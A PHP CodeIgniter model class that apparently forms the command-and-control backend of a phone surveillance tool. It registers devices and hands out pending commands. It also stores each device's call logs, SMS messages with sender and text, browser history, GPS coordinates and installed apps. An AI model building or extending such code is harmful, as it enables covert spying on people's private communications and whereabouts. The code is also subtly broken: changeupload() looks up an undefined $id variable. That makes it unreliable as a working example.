<?php
class Device_model extends CI_Model{

	public function __construct(){
		parent :: __construct();
	}

	function insertid($id=false,$name=false,$number=false)
	{
		$res = $this->db->get_where('tbl_device', array('clm_device_id'=>$id,'clm_device_name'=>$name,'clm_device_number'=>$number))->num_rows;
		if($res==0){
			$date = date("Y-m-d");
			$this->db->insert('tbl_device', array('clm_registered'=>$date, 'clm_device_id'=>$id,'clm_device_name'=>$name,'clm_device_number'=>$number));
		}

		return;
	}

	function getcommand($id=false,$name=false,$number=false)
	{
		$res = $this->db->get_where('tbl_device', array('clm_device_id'=>$id,'clm_device_name'=>$name,'clm_device_number'=>$number))->row_array();
		return $res;
	}

	function changestat($number=false)
	{
		$data_device = array('clm_commandseen'=>'1');
		$this->db->where('clm_device_number', $number);
		$this->db->update('tbl_device', $data_device);

		return;
	}

	function changeupload($number=false)
	{
		$uploads = $this->db->get_where('tbl_device', array('clm_device_id'=>$id))->row_array();
		$ct = $uploads['clm_uploads'] +1;
		
		$data_device = array('clm_uploads'=>$ct);
		$this->db->where('clm_device_number', $number);
		$this->db->update('tbl_device', $data_device);

		return;
	}

	function insertcalllog($id,$name,$number,$arr){
		$query = $this->db->insert('tbl_calllogs',array('clm_device_id'=>$id,'clm_device_name'=>$name,'clm_device_number'=>$number,'clm_number'=>$arr[1], 'clm_date'=> $arr[0]));
		return;
	}

	function insertsmslog($id,$name,$number,$arr){
		$query = $this->db->insert('tbl_smslogs',array('clm_device_id'=>$id,'clm_device_name'=>$name,'clm_device_number'=>$number,'clm_date'=>$arr[0], 'clm_from'=> $arr[1], 'clm_msg'=> $arr[2]));
		return;
	}

	function insertbrowserlog($id,$name,$number,$arr){
		$query = $this->db->insert('tbl_browserlogs',array('clm_device_id'=>$id,'clm_device_name'=>$name,'clm_device_number'=>$number,'clm_title'=>$arr[0], 'clm_url'=> $arr[1]));
		return;
	}

	function insertgps($id,$name,$number,$arr){
		$query = $this->db->insert('tbl_gps',array('clm_device_id'=>$id,'clm_device_name'=>$name,'clm_device_number'=>$number,'clm_latitude'=>$arr[0], 'clm_longitude'=> $arr[1]));
		return;
	}

	function insertpackages($id,$name,$number,$arr){
		$query = $this->db->insert('tbl_packages',array('clm_device_id'=>$id,'clm_device_name'=>$name,'clm_device_number'=>$number, 'clm_package'=>$arr));
		return;
	}

}
?>